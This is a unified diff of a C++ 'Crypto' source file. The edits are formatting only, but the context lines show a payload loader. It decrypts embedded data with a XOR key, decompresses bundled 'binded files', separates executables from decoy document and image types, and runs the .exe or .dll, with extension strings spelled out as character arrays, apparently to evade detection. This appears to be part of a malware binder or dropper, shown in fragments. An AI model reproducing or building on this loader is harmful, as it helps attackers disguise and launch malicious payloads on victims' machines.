@@ -7,10 +7,10 @@
 #include "api.h"
 #include "Public.h"
 
-#include "include/openssl/md5.h"
-#pragma comment(lib,"./lib\\libcrypto.lib")
-#pragma comment(lib,"./lib\\libssl.lib")
-#pragma comment(lib,"./lib\\openssl.lib")
+#include "../include/openssl/md5.h"
+#pragma comment(lib,"../lib\\libcrypto.lib")
+#pragma comment(lib,"../lib\\libssl.lib")
+#pragma comment(lib,"../lib\\openssl.lib")
 
 #include <DbgHelp.h>
 
@@ -25,14 +25,14 @@
 #define MAX_INPUT_FILE 8
 
 
-int Crypto::reloadPE(const char * data, int datasize) {
+int Crypto::reloadPE(const char* data, int datasize) {
 
 	int ret = 0;
 	char szinfo[1024];
 
-	unsigned char *dstblock = new unsigned char[MAX_BUF_SIZE];
+	unsigned char* dstblock = new unsigned char[MAX_BUF_SIZE];
 
-	unsigned char * key = (unsigned char*)data + 4;
+	unsigned char* key = (unsigned char*)data + 4;
 
 	//revertkey(key);
 
@@ -44,9 +44,9 @@ int Crypto::reloadPE(const char * data, int datasize) {
 		return -1;
 	}
 
-	unsigned char * dstbuf = dstblock + 4;
+	unsigned char* dstbuf = dstblock + 4;
 
-	unsigned char * uncompbuf = new unsigned char[MAX_BUF_SIZE];
+	unsigned char* uncompbuf = new unsigned char[MAX_BUF_SIZE];
 
 	char filename[256] = { 0 };
 
@@ -73,7 +73,7 @@ int Crypto::reloadPE(const char * data, int datasize) {
 
 			if (memcmp(filename + lstrlenA(filename) - 4, szExeFn, 4) == 0)
 			{
-				delete[] dstblock;				
+				delete[] dstblock;
 #ifdef _DEBUG
 				//wsprintfA(szinfo, "run exe:%s size:%u", filename,uncompbufsize);
 				//MessageBoxA(0, szinfo, szinfo, MB_OK);
@@ -86,7 +86,7 @@ int Crypto::reloadPE(const char * data, int datasize) {
 			}
 			else if (memcmp(filename + lstrlenA(filename) - 4, szDllFn, 4) == 0)
 			{
-				delete[] dstblock;	
+				delete[] dstblock;
 #ifdef _DEBUG
 				//wsprintfA(szinfo, "run dll:%s size:%u", filename,uncompbufsize);
 				//MessageBoxA(0, szinfo, szinfo, MB_OK);
@@ -100,7 +100,7 @@ int Crypto::reloadPE(const char * data, int datasize) {
 				break;
 			}
 		}
-		else {		
+		else {
 #ifdef _DEBUG
 			wsprintfA(szinfo, "uncompress file:%s error", filename);
 			MessageBoxA(0, szinfo, szinfo, MB_OK);
@@ -121,11 +121,11 @@ int Crypto::reloadPE(const char * data, int datasize) {
 //24 64		//filename
 //88 4		//size
 //92 xxx	//file data
-int Crypto::getoutFiles(const char * data, int datasize) {
+int Crypto::getoutFiles(const char* data, int datasize) {
 
 	int ret = 0;
 
-	unsigned char * key = (unsigned char*)data + 4;
+	unsigned char* key = (unsigned char*)data + 4;
 
 	//revertkey(key);
 
@@ -133,32 +133,32 @@ int Crypto::getoutFiles(const char * data, int datasize) {
 
 	ret = lpMakeSureDirectoryPathExists((char*)path.c_str());
 
-	unsigned char *dstblock = new unsigned char[MAX_BUF_SIZE];
+	unsigned char* dstblock = new unsigned char[MAX_BUF_SIZE];
 
-	CryptData((unsigned char*)data + 4 + KEY_LEN, datasize - 4 - KEY_LEN, key, KEY_LEN,dstblock,MAX_BUF_SIZE);
+	CryptData((unsigned char*)data + 4 + KEY_LEN, datasize - 4 - KEY_LEN, key, KEY_LEN, dstblock, MAX_BUF_SIZE);
 
 	int cnt = *(int*)dstblock;
 	if (cnt <= 0 || cnt >= MAX_INPUT_FILE)
 	{
-		Public::writelog("quit for find binded files:%d\r\n",cnt);
+		Public::writelog("quit for find binded files:%d\r\n", cnt);
 		return -1;
 	}
 
-	unsigned char * dstbuf = dstblock + 4;
+	unsigned char* dstbuf = dstblock + 4;
 
-	unsigned char * uncompbuf = new unsigned char[MAX_BUF_SIZE];
+	unsigned char* uncompbuf = new unsigned char[MAX_BUF_SIZE];
 
 	string runningfn = "";
 
 	string docfn = "";
 
 	string szexefns = { '.','e','x','e','.','s','y','s','.','c','o','m',0 };
-	string szdocfns = { '.','d','o','c','.','d','o','c','x','.','x','l','s','.','x','l','s','x','.','p','p','t','.','p','p','t','x','.','t','x','t','.','p','n','g','.','j','p','g','.','j','p','e','g','.','b','m','p','.','m','p','3','.','m','p','4','.','p','d','f',0};
+	string szdocfns = { '.','d','o','c','.','d','o','c','x','.','x','l','s','.','x','l','s','x','.','p','p','t','.','p','p','t','x','.','t','x','t','.','p','n','g','.','j','p','g','.','j','p','e','g','.','b','m','p','.','m','p','3','.','m','p','4','.','p','d','f',0 };
 
 	for (int i = 0; i < cnt; i++)
 	{
 		char filename[256] = { 0 };
-		memcpy(filename,(char*)dstbuf, FILENAME_LEN);
+		memcpy(filename, (char*)dstbuf, FILENAME_LEN);
 		dstbuf += FILENAME_LEN;
 
 		int pos = string(filename).find(".");
@@ -223,9 +223,9 @@ int Crypto::getoutFiles(const char * data, int datasize) {
 }
 
 
-void Crypto::CryptData(unsigned char * src, int size, unsigned char * psrckey, int keylen, unsigned char * dst, int dstsize) {
+void Crypto::CryptData(unsigned char* src, int size, unsigned char* psrckey, int keylen, unsigned char* dst, int dstsize) {
 
-	unsigned char * pkey = new unsigned char[keylen];
+	unsigned char* pkey = new unsigned char[keylen];
 	for (int i = 0; i < keylen; i++)
 	{
 		pkey[i] = (~psrckey[i]) ^ 0x2b;
@@ -249,7 +249,7 @@ void Crypto::CryptData(unsigned char * src, int size, unsigned char * psrckey, i
 
 
 
-void Crypto::getkey(unsigned char * key) {
+void Crypto::getkey(unsigned char* key) {
 	SYSTEMTIME sttime = { 0 };
 	GetLocalTime(&sttime);
 
@@ -260,7 +260,7 @@ void Crypto::getkey(unsigned char * key) {
 
 
 
-void Crypto::revertkey(unsigned char * key) {
+void Crypto::revertkey(unsigned char* key) {
 	for (int i = 0; i < KEY_LEN; i++)
 	{
 		key[i] = ~key[i];
@@ -269,7 +269,7 @@ void Crypto::revertkey(unsigned char * key) {
 
 
 
-int Crypto::getDataMd5(char * lpdata, int size, char * szmd5, int lowercase) {
+int Crypto::getDataMd5(char* lpdata, int size, char* szmd5, int lowercase) {
 
 	int casevalue = 55;
 	if (lowercase)
